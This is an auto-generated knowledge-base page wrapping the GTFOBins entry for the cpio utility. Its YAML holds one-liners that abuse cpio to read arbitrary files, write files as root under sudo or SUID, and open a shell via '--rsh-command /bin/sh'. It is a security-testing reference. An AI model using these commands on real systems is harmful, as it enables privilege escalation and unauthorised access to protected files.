---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# cpio

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `cpio` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [cpio](../../tools/linux/cpio.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | cpio |
| name | cpio |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/cpio/ |

## Preserved Source Material

```yaml
_body: ''
_name: cpio
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cpio
functions:
  file-read:
  - binary: false
    code: echo /path/to/input-file | cpio -o
    comment: The content of the file is printed to standard output, between the `cpio` archive format header and footer.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  - code: 'echo /path/to/input-file | cpio -dp .

      cat path/to/input-file'
    comment: The whole directory structure is copied to `.`, hence this is also a file write.
    contexts:
      sudo:
        code: 'echo /path/to/input-file | cpio -R $UID -dp .

          cat path/to/input-file'
      suid:
        code: 'echo /path/to/input-file | cpio -R $UID -dp .

          cat path/to/input-file'
      unprivileged: null
  file-write:
  - code: 'echo DATA >/path/to/temp-file

      echo /path/to/temp-file | cpio -udp .'
    comment: The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
    contexts:
      sudo:
        code: 'echo DATA >/path/to/temp-file

          echo /path/to/temp-file | cpio -R 0:0 -udp .'
      suid:
        code: 'echo DATA >/path/to/temp-file

          echo /path/to/temp-file | cpio -R 0:0 -udp .'
      unprivileged: null
  shell:
  - code: 'echo ''/bin/sh </dev/tty >/dev/tty'' >localhost

      cpio -o --rsh-command /bin/sh -F localhost:'
    contexts:
      sudo: null
```
